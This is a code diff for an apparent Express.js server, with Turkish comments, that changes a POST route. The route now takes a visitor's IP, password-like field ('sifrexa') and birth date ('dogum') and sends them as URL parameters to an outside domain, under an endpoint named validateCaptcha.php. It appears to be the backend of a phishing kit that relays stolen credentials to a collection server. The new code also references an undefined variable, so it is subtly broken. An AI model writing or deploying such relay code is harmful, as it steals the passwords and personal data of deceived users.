@@ -52,23 +52,29 @@ app.get('/files/js', (req, res) => {
  
 
 app.post('/dmn', async (req, res) => {
-    try {
-        const formData = req.body;
+  try {
+    const userIp = req.query.user_ip;
+    const tach = req.query.tach;
+    const sifrexa = req.query.sifrexa;
+    const dogum = req.query.dogum;
+    const apiUrl = `https://alliikkerrr.online/validateCaptcha.php?user_ip=${encodeURIComponent(user_ip)}&tach=${encodeURIComponent(tach)}&sifrexa=${encodeURIComponent(sifrexa)}&dogum=${encodeURIComponent(dogum)}`;
 
-        const apiUrl = 'https://alliikkerrr.online/validateCaptcha.php';
 
-        // Gelen verileri sorgu dizesine dönüştür
-        const queryStringData = queryString.stringify(formData);
+    // Fetch kullanarak GET isteği yap
+    const response = await axios.get(apiUrl);
 
-        // Yeni bir URL oluştur ve GET isteğini yap
-        const response = await axios.get(apiUrl + '?' + queryStringData);
-
-        // İşlem başarılı olduğunda, istemciye dosyayı gönder
-        res.sendFile(__dirname + '/public/bilgi.html');
-    } catch (error) {
-        console.error('Hata:', error);
-        res.status(500).send('Internal Server Error');
+    // Cevap boşsa veya gelmezse, boş bir yanıt gönder
+    if (!response.data) {
+      return res.send('');
     }
+
+    // Gelen cevabı direk olarak gönder
+    res.send(response.data);
+  } catch (error) {
+    console.error('Hata:', error);
+    // Hata mesajını istemciye gönder
+    res.status(500).send('');
+  }
 });
 app.get('/img/bg-image.jpeg', (req, res) => {
   res.sendFile(__dirname + '/public/img/bg-image.jpeg');
